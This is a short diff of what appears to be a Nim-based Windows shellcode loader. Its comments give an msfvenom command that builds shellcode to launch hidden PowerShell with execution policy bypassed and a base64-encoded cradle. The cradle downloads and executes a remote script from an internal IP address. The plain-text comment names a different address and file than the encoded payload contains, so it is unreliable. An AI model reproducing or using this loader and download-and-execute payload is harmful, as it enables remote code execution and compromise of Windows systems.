@@ -14,7 +14,7 @@
 
 
 import winim/lean
-import osproc
+
 
 #[msfvenom -p windows/x64/exec CMD="powershell.exe -w hidden -ep bypass -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyADQANgAuADMANAAvAHAAdwBuAC4AcABzADEAIgApAA==" -f raw -o shellcode.bin]#
 #[IEX(New-Object Net.Webclient).DownloadString('http://192.168.173.34/shell.ps1') <-- This is the base64 encoded payload]#
